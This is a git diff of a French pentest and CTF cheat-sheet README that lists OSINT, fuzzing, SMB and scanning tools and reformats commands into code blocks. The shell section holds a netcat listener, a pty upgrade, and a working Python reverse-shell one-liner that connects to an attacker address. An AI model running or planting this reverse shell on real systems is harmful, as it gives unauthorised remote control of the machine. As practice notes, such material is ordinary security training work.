@@ -1,7 +1,3 @@
-# CTF
-Write-up des chall que j'ai réalisé
-
-
 # TOOLS
 FrameWork pour OSINT de numero de telephone => phoneinfoga 
 FUZZ => Feroxbuster, dirb, dirbuster, gobuster
@@ -55,9 +51,11 @@ enum4linux.py : Fait tout un tas de test sur le SMB
 
 -----Scanner-----
 
-nmapAutomator : git clone https://github.com/21y4d/nmapAutomator.git
-                sudo ln -s $(pwd)/nmapAutomator/nmapAutomator.sh /usr/local/bin/
-                
+nmapAutomator : 
+```
+git clone https://github.com/21y4d/nmapAutomator.git
+sudo ln -s $(pwd)/nmapAutomator/nmapAutomator.sh /usr/local/bin/
+```                
 -----WEB------
 
 Nikto : Pentest Web -> check une URL
@@ -86,10 +84,12 @@ Netcat Ecoute :
 nc -lvnp $port
 
 Avoir un shell :
+```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-
+```
+```
 export RHOST="10.10.14.5";export RPORT=4242;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
-
+```
 Autre NetCat : https://github.com/xct/xc
 ............ : https://github.com/calebstewart/pwncat
 
